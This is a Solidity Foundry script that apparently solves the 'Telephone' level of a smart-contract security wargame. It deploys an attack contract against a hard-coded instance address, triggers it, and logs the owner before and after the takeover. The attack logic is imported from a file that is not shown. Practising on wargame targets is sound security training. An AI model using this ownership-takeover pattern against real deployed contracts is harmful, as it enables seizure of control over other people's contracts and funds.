// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Telephone} from "../src/levels/Telephone.sol";
import {TelephoneAttack} from "../src/attacks/TelephoneAttack.sol";

contract TelephoneScript is Script {
    Telephone public instance = Telephone(payable(0x76dBBfdC31eC18BA43b41a4dEc531C7A41332fec));
    TelephoneAttack public attacker;

    function run() external {
        vm.startBroadcast();
        attacker = new TelephoneAttack(address(instance));
        console.log("TelephoneAttack Contract deployed to:", address(attacker));
        console.log("Old owner:", instance.owner());
        console.log("Attacking...");
        attacker.attack();
        console.log("New owner:", instance.owner());
        vm.stopBroadcast();
    }
}
